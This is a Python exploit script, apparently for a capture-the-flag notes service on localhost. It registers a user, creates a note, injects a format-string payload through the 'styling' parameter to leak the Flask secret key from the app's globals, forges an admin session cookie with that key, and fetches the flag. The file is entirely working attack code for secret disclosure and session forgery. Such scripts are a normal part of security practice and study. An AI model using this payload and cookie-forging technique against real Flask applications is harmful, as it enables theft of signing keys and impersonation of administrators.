import requests
import re

from flask import Flask
from flask.sessions import SecureCookieSessionInterface


def get_session_cookie(data, secret_key):
    """Get session with data stored in it"""
    app = Flask("sploit")
    app.secret_key = secret_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    return session_serializer.dumps(data)


HOST = 'http://localhost:8008'

resp = requests.post(HOST + '/register', data={'username': 'testtest123', 'password': '123321123321asdzxc'})
print("Register status code = ", resp.status_code)

s = requests.Session()
resp = s.post(HOST + '/login', data={'username': 'testtest123', 'password': '123321123321asdzxc'})
print("Login status code = ", resp.status_code)

resp = s.post(HOST + '/notes', data={'name': 'test', 'content': 'test'})
print("Get notes status code = ", resp.status_code)

note_uid_regex = r"\/note\/([a-z0-9-]+)"
note_uuid = re.findall(note_uid_regex, resp.text)[-1]

print("Created note UUID=", note_uuid)

resp = s.get(HOST + '/note/' + note_uuid, params={'styling': '{np.paragraphs.__globals__[app].secret_key}'})

leak_regex = r"body class=\"(.*)\">"

secret_key_leak = re.findall(leak_regex, resp.text)[-1]

print("Leaked secret key=", secret_key_leak)

session_cookie = get_session_cookie({'user': 'admin'}, secret_key_leak)

print("Session cookie=", session_cookie)

resp = requests.get(HOST + '/notes', cookies={'session': session_cookie})

print("Flag should be here...")
print(resp.text)
